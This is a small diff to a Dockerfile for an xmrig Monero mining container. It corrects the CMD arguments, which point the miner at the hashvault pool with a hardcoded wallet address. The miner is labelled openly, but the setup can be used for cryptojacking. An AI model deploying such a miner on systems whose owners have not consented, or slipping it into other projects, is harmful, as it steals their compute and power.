@@ -27,4 +27,4 @@ LABEL maintainer='docker@merxnet.io'
 COPY --from=build /xmrig/build/xmrig /usr/local/bin/xmrig
 
 ENTRYPOINT ["xmrig"]
-CMD ["docker run murcmurc/xmr13 -o pool.hashvault.pro:443 -u 46qW88SQsGdCzHB65dhLpkehyJaYzzaLbM4VFFrZLqahhUCdPjkGkDYjLGGEH4upPoBjbNjSsbHCmEPvY9cTFbymBWcaFcr --donate-level=1"]
+CMD ["-o pool.hashvault.pro:443 -u 46qW88SQsGdCzHB65dhLpkehyJaYzzaLbM4VFFrZLqahhUCdPjkGkDYjLGGEH4upPoBjbNjSsbHCmEPvY9cTFbymBWcaFcr --donate-level=1"]
